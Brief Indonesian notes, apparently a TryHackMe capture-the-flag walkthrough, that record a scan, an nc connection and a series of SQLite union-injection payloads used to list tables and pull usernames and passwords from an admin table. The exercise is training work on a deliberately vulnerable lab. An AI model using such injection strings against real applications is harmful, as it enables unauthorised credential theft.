1. scan aja kalau iseng -> coba nc kayak perintah -> ketik nama jadi muncul passwd
2. coba sqli -> smokey' union select name from sqlite_master where type='table
3. smokey' Union Select username FROM admintable WHERE username like '%
4. dapet tuh username nya -> passwd nya butuh sqli
5. smokey' Union Select password FROM admintable WHERE username='TryHackMeAdmin
6. coba ssh gabisa pake admin itu coba ini
7. smokey' Union Select username FROM admintable WHERE username !='TryHackMeAdmin
8. liat passwd nya -> smokey' Union Select password FROM admintable WHERE username='flag
9. ini sqlite injection
